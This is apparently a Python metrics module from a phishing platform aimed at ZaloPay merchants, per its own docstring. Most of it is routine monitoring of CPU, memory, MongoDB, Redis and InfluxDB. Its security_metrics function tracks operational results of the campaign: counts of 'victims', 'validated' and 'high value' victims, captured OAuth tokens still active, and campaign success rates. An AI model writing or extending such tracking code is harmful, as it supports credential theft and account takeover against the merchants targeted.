"""
Metrics Collection for ZaloPay Merchant Phishing Platform
System metrics, request metrics, and custom application metrics
"""

import logging
import time
import psutil
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional
from influxdb_client import InfluxDBClient, Point
from influxdb_client.client.write_api import SYNCHRONOUS

from config import settings

logger = logging.getLogger(__name__)

class MetricsCollector:
    """Metrics collection and reporting to InfluxDB"""
    
    def __init__(self):
        self.influx_client = None
        self.write_api = None
        self.bucket = settings.INFLUXDB_BUCKET
        self.org = settings.INFLUXDB_ORG
        
        # Initialize InfluxDB client
        self._init_influxdb()
        
        # Metrics storage
        self.request_metrics = {
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "response_times": []
        }
        
        self.system_metrics = {
            "cpu_percent": 0,
            "memory_percent": 0,
            "disk_usage": 0,
            "network_io": {"bytes_sent": 0, "bytes_recv": 0}
        }
    
    def _init_influxdb(self):
        """Initialize InfluxDB client"""
        try:
            self.influx_client = InfluxDBClient(
                url=settings.INFLUXDB_URL,
                token=settings.INFLUXDB_TOKEN,
                org=self.org
            )
            
            self.write_api = self.influx_client.write_api(write_options=SYNCHRONOUS)
            
            # Test connection
            self.influx_client.ping()
            logger.info("InfluxDB client initialized successfully")
            
        except Exception as e:
            logger.error(f"Failed to initialize InfluxDB client: {e}")
            self.influx_client = None
            self.write_api = None
    
    async def collect_system_metrics(self) -> Dict[str, Any]:
        """Collect system metrics"""
        try:
            # CPU metrics
            cpu_percent = psutil.cpu_percent(interval=1)
            cpu_count = psutil.cpu_count()
            
            # Memory metrics
            memory = psutil.virtual_memory()
            memory_percent = memory.percent
            memory_used = memory.used
            memory_total = memory.total
            
            # Disk metrics
            disk = psutil.disk_usage('/')
            disk_percent = disk.percent
            disk_used = disk.used
            disk_total = disk.total
            
            # Network metrics
            network = psutil.net_io_counters()
            network_bytes_sent = network.bytes_sent
            network_bytes_recv = network.bytes_recv
            
            # Process metrics
            process = psutil.Process()
            process_cpu = process.cpu_percent()
            process_memory = process.memory_info()
            
            metrics = {
                "timestamp": datetime.now(timezone.utc),
                "cpu": {
                    "percent": cpu_percent,
                    "count": cpu_count
                },
                "memory": {
                    "percent": memory_percent,
                    "used_bytes": memory_used,
                    "total_bytes": memory_total
                },
                "disk": {
                    "percent": disk_percent,
                    "used_bytes": disk_used,
                    "total_bytes": disk_total
                },
                "network": {
                    "bytes_sent": network_bytes_sent,
                    "bytes_received": network_bytes_recv
                },
                "process": {
                    "cpu_percent": process_cpu,
                    "memory_rss": process_memory.rss,
                    "memory_vms": process_memory.vms
                }
            }
            
            # Update system metrics
            self.system_metrics.update({
                "cpu_percent": cpu_percent,
                "memory_percent": memory_percent,
                "disk_usage": disk_percent,
                "network_io": {
                    "bytes_sent": network_bytes_sent,
                    "bytes_recv": network_bytes_recv
                }
            })
            
            return metrics
            
        except Exception as e:
            logger.error(f"Failed to collect system metrics: {e}")
            return {}
    
    async def collect_application_metrics(self) -> Dict[str, Any]:
        """Collect application-specific metrics"""
        try:
            from database.connection import get_database_connection
            
            # Database metrics
            mongo_client = get_database_connection("mongodb")
            redis_client = get_database_connection("redis")
            
            # MongoDB metrics
            mongo_stats = mongo_client.admin.command("serverStatus")
            mongo_connections = mongo_stats.get("connections", {})
            mongo_operations = mongo_stats.get("opcounters", {})
            
            # Redis metrics
            redis_info = redis_client.info()
            redis_connected_clients = redis_info.get("connected_clients", 0)
            redis_used_memory = redis_info.get("used_memory", 0)
            redis_keyspace_hits = redis_info.get("keyspace_hits", 0)
            redis_keyspace_misses = redis_info.get("keyspace_misses", 0)
            
            # Application metrics
            app_metrics = {
                "timestamp": datetime.now(timezone.utc),
                "database": {
                    "mongodb": {
                        "connections_current": mongo_connections.get("current", 0),
                        "connections_available": mongo_connections.get("available", 0),
                        "operations_query": mongo_operations.get("query", 0),
                        "operations_insert": mongo_operations.get("insert", 0),
                        "operations_update": mongo_operations.get("update", 0),
                        "operations_delete": mongo_operations.get("delete", 0)
                    },
                    "redis": {
                        "connected_clients": redis_connected_clients,
                        "used_memory": redis_used_memory,
                        "keyspace_hits": redis_keyspace_hits,
                        "keyspace_misses": redis_keyspace_misses,
                        "hit_rate": redis_keyspace_hits / (redis_keyspace_hits + redis_keyspace_misses) if (redis_keyspace_hits + redis_keyspace_misses) > 0 else 0
                    }
                },
                "application": {
                    "total_requests": self.request_metrics["total_requests"],
                    "successful_requests": self.request_metrics["successful_requests"],
                    "failed_requests": self.request_metrics["failed_requests"],
                    "success_rate": self.request_metrics["successful_requests"] / self.request_metrics["total_requests"] if self.request_metrics["total_requests"] > 0 else 0,
                    "average_response_time": sum(self.request_metrics["response_times"]) / len(self.request_metrics["response_times"]) if self.request_metrics["response_times"] else 0
                }
            }
            
            return app_metrics
            
        except Exception as e:
            logger.error(f"Failed to collect application metrics: {e}")
            return {}
    
    async def collect_security_metrics(self) -> Dict[str, Any]:
        """Collect security-related metrics"""
        try:
            from database.connection import get_database_connection
            
            mongo_client = get_database_connection("mongodb")
            db = mongo_client.get_database(settings.MONGODB_DATABASE)
            
            # Victim metrics
            victims_collection = db.victims
            total_victims = victims_collection.count_documents({})
            validated_victims = victims_collection.count_documents({"validation.status": "validated"})
            high_value_victims = victims_collection.count_documents({"validation.market_value": {"$gte": 100000}})
            
            # OAuth metrics
            oauth_collection = db.oauth_tokens
            total_oauth_tokens = oauth_collection.count_documents({})
            active_oauth_tokens = oauth_collection.count_documents({"token_metadata.token_status": "active"})
            
            # Campaign metrics
            campaigns_collection = db.campaigns
            total_campaigns = campaigns_collection.count_documents({})
            active_campaigns = campaigns_collection.count_documents({"status": "active"})
            
            # Activity metrics
            activity_collection = db.activity_logs
            recent_activities = activity_collection.count_documents({
                "timestamp": {"$gte": datetime.now(timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)}
            })
            
            security_metrics = {
                "timestamp": datetime.now(timezone.utc),
                "victims": {
                    "total": total_victims,
                    "validated": validated_victims,
                    "high_value": high_value_victims,
                    "validation_rate": validated_victims / total_victims if total_victims > 0 else 0
                },
                "oauth": {
                    "total_tokens": total_oauth_tokens,
                    "active_tokens": active_oauth_tokens,
                    "success_rate": active_oauth_tokens / total_oauth_tokens if total_oauth_tokens > 0 else 0
                },
                "campaigns": {
                    "total": total_campaigns,
                    "active": active_campaigns,
                    "success_rate": active_campaigns / total_campaigns if total_campaigns > 0 else 0
                },
                "activity": {
                    "daily_activities": recent_activities
                }
            }
            
            return security_metrics
            
        except Exception as e:
            logger.error(f"Failed to collect security metrics: {e}")
            return {}
    
    async def send_metrics_to_influxdb(self, metrics: Dict[str, Any], measurement: str):
        """Send metrics to InfluxDB"""
        try:
            if not self.write_api:
                logger.warning("InfluxDB write API not available")
                return False
            
            # Create InfluxDB point
            point = Point(measurement)
            
            # Add timestamp
            if "timestamp" in metrics:
                point.time(metrics["timestamp"])
            
            # Add fields recursively
            self._add_fields_to_point(point, metrics)
            
            # Write to InfluxDB
            self.write_api.write(bucket=self.bucket, org=self.org, record=point)
            
            logger.debug(f"Metrics sent to InfluxDB: {measurement}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to send metrics to InfluxDB: {e}")
            return False
    
    def _add_fields_to_point(self, point: Point, data: Dict[str, Any], prefix: str = ""):
        """Recursively add fields to InfluxDB point"""
        for key, value in data.items():
            if key == "timestamp":
                continue
            
            field_name = f"{prefix}{key}" if prefix else key
            
            if isinstance(value, dict):
                self._add_fields_to_point(point, value, f"{field_name}_")
            elif isinstance(value, (int, float)):
                point.field(field_name, value)
            elif isinstance(value, bool):
                point.field(field_name, value)
            elif isinstance(value, str):
                point.field(field_name, value)
    
    def record_request_metric(self, response_time: float, status_code: int):
        """Record request metric"""
        self.request_metrics["total_requests"] += 1
        
        if 200 <= status_code < 400:
            self.request_metrics["successful_requests"] += 1
        else:
            self.request_metrics["failed_requests"] += 1
        
        self.request_metrics["response_times"].append(response_time)
        
        # Keep only last 1000 response times
        if len(self.request_metrics["response_times"]) > 1000:
            self.request_metrics["response_times"] = self.request_metrics["response_times"][-1000:]
    
    async def collect_all_metrics(self) -> Dict[str, Any]:
        """Collect all metrics"""
        try:
            # Collect different types of metrics
            system_metrics = await self.collect_system_metrics()
            app_metrics = await self.collect_application_metrics()
            security_metrics = await self.collect_security_metrics()
            
            # Combine all metrics
            all_metrics = {
                "system": system_metrics,
                "application": app_metrics,
                "security": security_metrics,
                "timestamp": datetime.now(timezone.utc)
            }
            
            return all_metrics
            
        except Exception as e:
            logger.error(f"Failed to collect all metrics: {e}")
            return {}
    
    async def send_all_metrics(self):
        """Send all metrics to InfluxDB"""
        try:
            # Collect all metrics
            all_metrics = await self.collect_all_metrics()
            
            if not all_metrics:
                return False
            
            # Send system metrics
            if "system" in all_metrics and all_metrics["system"]:
                await self.send_metrics_to_influxdb(all_metrics["system"], "system_metrics")
            
            # Send application metrics
            if "application" in all_metrics and all_metrics["application"]:
                await self.send_metrics_to_influxdb(all_metrics["application"], "application_metrics")
            
            # Send security metrics
            if "security" in all_metrics and all_metrics["security"]:
                await self.send_metrics_to_influxdb(all_metrics["security"], "security_metrics")
            
            logger.info("All metrics sent to InfluxDB successfully")
            return True
            
        except Exception as e:
            logger.error(f"Failed to send all metrics: {e}")
            return False
    
    def get_metrics_summary(self) -> Dict[str, Any]:
        """Get metrics summary for API endpoints"""
        return {
            "system": self.system_metrics,
            "requests": {
                "total": self.request_metrics["total_requests"],
                "successful": self.request_metrics["successful_requests"],
                "failed": self.request_metrics["failed_requests"],
                "success_rate": self.request_metrics["successful_requests"] / self.request_metrics["total_requests"] if self.request_metrics["total_requests"] > 0 else 0,
                "average_response_time": sum(self.request_metrics["response_times"]) / len(self.request_metrics["response_times"]) if self.request_metrics["response_times"] else 0
            },
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

# Global metrics collector instance
metrics_collector = MetricsCollector()
